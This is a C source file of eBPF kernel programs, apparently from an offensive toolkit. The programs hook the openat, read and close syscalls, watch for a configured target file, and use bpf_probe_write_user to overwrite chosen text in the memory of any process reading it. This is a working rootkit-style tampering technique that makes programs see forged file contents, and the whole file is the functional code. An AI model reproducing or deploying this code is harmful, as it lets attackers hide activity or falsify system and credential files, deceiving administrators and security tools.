// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "textreplace2.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to hold the File Descriptors from 'openat' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, unsigned int);
} map_fds SEC(".maps");

// Map to fold the buffer sized from 'read' calls
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buff_addrs SEC(".maps");

// Map to fold the buffer sized from 'read' calls
// NOTE: This should probably be a map-of-maps, with the top-level
// key bing pid_tgid, so we know we're looking at the right program
#define MAX_POSSIBLE_ADDRS 500
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_name_addrs SEC(".maps");
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, MAX_POSSIBLE_ADDRS);
    __type(key, unsigned int);
    __type(value, long unsigned int);
} map_to_replace_addrs SEC(".maps");

// Map holding the programs for tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");

// Optional Target Parent PID
const volatile int target_ppid = 0;

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, int);
    __type(value, struct tr_file);
} map_filename SEC(".maps");
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 2);
    __type(key, int);
    __type(value, struct tr_text);
} map_text SEC(".maps");

SEC("fexit/__x64_sys_close")
int BPF_PROG(handle_close_exit, const struct pt_regs *regs, long ret)
{
    // Check if we're a process thread of interest
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&map_fds, &pid_tgid);
    bpf_map_delete_elem(&map_buff_addrs, &pid_tgid);

    return 0;
}

SEC("fentry/__x64_sys_openat")
int BPF_PROG(handle_openat_enter, struct pt_regs *regs)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int zero = PROG_00;
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0) {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task();
        int ppid = BPF_CORE_READ(task, real_parent, tgid);
        if (ppid != target_ppid) {
            return 0;
        }
    }

    // Get filename to check
    struct tr_file *pFile = bpf_map_lookup_elem(&map_filename, &zero);
    if (pFile == NULL) {
        return 0;
    }

    // Get filename from arguments
    char check_filename[FILENAME_LEN_MAX];
    bpf_probe_read_user(&check_filename, FILENAME_LEN_MAX, (void*)PT_REGS_PARM2(regs));

    // Check filename is our target
    for (int i = 0; i < FILENAME_LEN_MAX; i++) {
        if (i > pFile->filename_len) {
            break;
        }
        if (pFile->filename[i] != check_filename[i]) {
            return 0;
        }
    }

    // Add pid_tgid to map for our sys_exit call
    bpf_map_update_elem(&map_fds, &pid_tgid, &zero, BPF_ANY);

    return 0;
}

SEC("fexit/__x64_sys_openat")
int BPF_PROG(handle_openat_exit, struct pt_regs *regs, long ret)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    unsigned int* check = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (check == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;

    // Set the map value to be the returned file descriptor
    unsigned int fd = (unsigned int)ret;
    bpf_map_update_elem(&map_fds, &pid_tgid, &fd, BPF_ANY);

    return 0;
}

SEC("fentry/__x64_sys_read")
int BPF_PROG(handle_read_enter, struct pt_regs *regs)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the correct file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)PT_REGS_PARM1(regs);
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = PT_REGS_PARM2(regs);
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    size_t buff_size = (size_t)PT_REGS_PARM3(regs);
    // bpf_printk("[TEXT_REPLACE] PID %d | fd %d | buff_addr 0x%lx\n", pid, fd, buff_addr);
    // bpf_printk("[TEXT_REPLACE] PID %d | fd %d | buff_size %lu\n", pid, fd, buff_size);
    return 0;
}

SEC("fexit/__x64_sys_read")
int BPF_PROG(find_possible_addrs, struct pt_regs *regs, long ret)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int buff_addr = *pbuff_addr;
    long unsigned int name_addr = 0;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ret <= 0) {
        return 0;
    }
    long int buff_size = ret;
    long int read_size = buff_size;

    bpf_printk("[TEXT_REPLACE] PID %d | read_size %lu | buff_addr 0x%lx\n", pid, read_size, buff_addr);
    const unsigned int local_buff_size = 32;
    const unsigned int loop_size = 32;
    char local_buff[local_buff_size] = { 0x00 };

    if (read_size > (local_buff_size+1)) {
        // Need to loop :-(
        read_size = local_buff_size;
    }

    int index = PROG_00;
    struct tr_text *pFind = bpf_map_lookup_elem(&map_text, &index);
    if (pFind == NULL) {
        return 0;
    }

    // Read the data returned in chunks, and note every instance
    // of the first character of our 'to find' text.
    // This is all very convoluted, but is required to keep
    // the program complexity and size low enough the pass the verifier checks
    unsigned int tofind_counter = 0;
    for (unsigned int i = 0; i < loop_size; i++) {
        // Read in chunks from buffer
        bpf_probe_read(&local_buff, read_size, (void*)buff_addr);
        for (unsigned int j = 0; j < local_buff_size; j++) {
            // Look for the first char of our 'to find' text
            if (local_buff[j] == pFind->text[0]) {
                name_addr = buff_addr+j;
                // This is possibly out text, add the address to the map to be
                // checked by program 'check_possible_addrs'
                bpf_map_update_elem(&map_name_addrs, &tofind_counter, &name_addr, BPF_ANY);
                tofind_counter++;
            }
        }

        buff_addr += local_buff_size;
    }

    // Tail-call into 'check_possible_addrs' to loop over possible addresses
    // bpf_printk("[TEXT_REPLACE] PID %d | tofind_counter %d \n", pid, tofind_counter);

    bpf_tail_call(ctx, &map_prog_array, PROG_01);
    return 0;
}

char name_cmp[TEXT_LEN_MAX+1];

SEC("fexit/__x64_sys_read")
int BPF_PROG(check_possible_addresses, struct pt_regs *regs, long ret)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int newline_counter = 0;
    unsigned int match_counter = 0;

    unsigned int j = 0;
    char old = 0;

    int index = PROG_00;
    struct tr_text *pFind = bpf_map_lookup_elem(&map_text, &index);
    if (pFind == NULL) {
        return 0;
    }

    const unsigned int name_len = pFind->text_len;
    if (name_len < 0) {
        return 0;
    }
    if (name_len > TEXT_LEN_MAX) {
        return 0;
    }
    // Go over every possibly location
    // and check if it really does match our text
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        newline_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_name_addrs, &newline_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }
        bpf_probe_read_user(&name_cmp, TEXT_LEN_MAX, (char*)name_addr);
        for (j = 0; j < TEXT_LEN_MAX; j++) {
            if (name_cmp[j] != pFind->text[j]) {
                break;
            }
        }
        // for newer kernels, maybe use bpf_strncmp
        // const char *p = name_cmp;
        // if (bpf_strncmp(pFind->text, TEXT_LEN_MAX, p) == 0) {
        if (j >= name_len) {
            // ***********
            // We've found out text!
            // Add location to map to be overwritten
            // ***********
            bpf_map_update_elem(&map_to_replace_addrs, &match_counter, &name_addr, BPF_ANY);
            match_counter++;
        }
        bpf_map_delete_elem(&map_name_addrs, &newline_counter);
    }

    // If we found at least one match, jump into program to overwrite text
    if (match_counter > 0) {
        bpf_tail_call(ctx, &map_prog_array, PROG_02);
    }
    return 0;
}


SEC("fexit/__x64_sys_read")
int BPF_PROG(overwrite_addresses, struct pt_regs *regs, long ret)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    int pid = pid_tgid >> 32;
    long unsigned int* pName_addr = 0;
    long unsigned int name_addr = 0;
    unsigned int match_counter = 0;

    int index = PROG_01;
    struct tr_text *pReplace = bpf_map_lookup_elem(&map_text, &index);
    if (pReplace == NULL) {
        return 0;
    }

    // Loop over every address to replace text into
    for (unsigned int i = 0; i < MAX_POSSIBLE_ADDRS; i++) {
        match_counter = i;
        pName_addr = bpf_map_lookup_elem(&map_to_replace_addrs, &match_counter);
        if (pName_addr == 0) {
            break;
        }
        name_addr = *pName_addr;
        if (name_addr == 0) {
            break;
        }
        // Attempt to overwrite data with out replace string (minus the end null bytes)
        // We have to do it this long way to deal with the variable text_len
        char data[TEXT_LEN_MAX];
        bpf_probe_read_user(&data, TEXT_LEN_MAX, (void*)name_addr);
        for (unsigned int j = 0; j < TEXT_LEN_MAX; j++) {
            if (j >= pReplace->text_len) {
                break;
            }
            data[j] = pReplace->text[j];
        }
        long ret = bpf_probe_write_user((void*)name_addr, (void*)data, TEXT_LEN_MAX);
    
        // Send event
        struct event *e;
        e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
        if (e) {
            e->success = (ret == 0);
            e->pid = pid;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            bpf_ringbuf_submit(e, 0);
        }

        int index = PROG_00;
        struct tr_text *pFind = bpf_map_lookup_elem(&map_text, &index);
        if (pFind == NULL) {
            return 0;
        }
        bpf_printk("[TEXT_REPLACE] PID %d | [*] replaced: %s\n", pid, pFind->text);
        
        // Clean up map now we're done
        bpf_map_delete_elem(&map_to_replace_addrs, &match_counter);
    }

    return 0;
}
